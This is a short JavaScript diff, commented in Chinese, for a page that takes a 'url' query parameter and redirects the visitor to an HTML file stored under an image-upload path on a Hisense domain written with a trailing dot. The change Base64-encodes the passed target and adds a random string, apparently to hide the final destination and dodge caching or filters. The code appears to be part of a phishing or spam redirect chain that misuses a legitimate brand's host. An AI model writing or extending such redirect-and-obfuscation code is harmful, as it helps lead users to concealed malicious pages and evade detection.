@@ -9,15 +9,15 @@
 const queryString = window.location.search;
 const urlParams = new URLSearchParams(queryString);
 const customParam = urlParams.get('url');
-const decodedCustomParam = decodeURIComponent(customParam);
 
 // 生成随机数字和英文组合
 const randomString = Math.random().toString(36).substring(2); // 生成随机字符串，包括数字和小写字母
 
-// 构建跳转链接
+// 使用Base64编码传递参数
 let redirectURL = "http://img.shop.hisense.com./2024/05/11/5b0b8b8c-9b6d-4551-aa7d-c769052f32da.html";
 if (customParam) {
-  redirectURL += "?url=" + decodedCustomParam + "?" + randomString; // 将随机字符串添加到参数后面
+  const base64Param = btoa(customParam); // 对参数进行Base64编码
+  redirectURL += "?url=" + base64Param + "?" + randomString; // 将随机字符串添加到参数后面
 }
 
 // 执行跳转
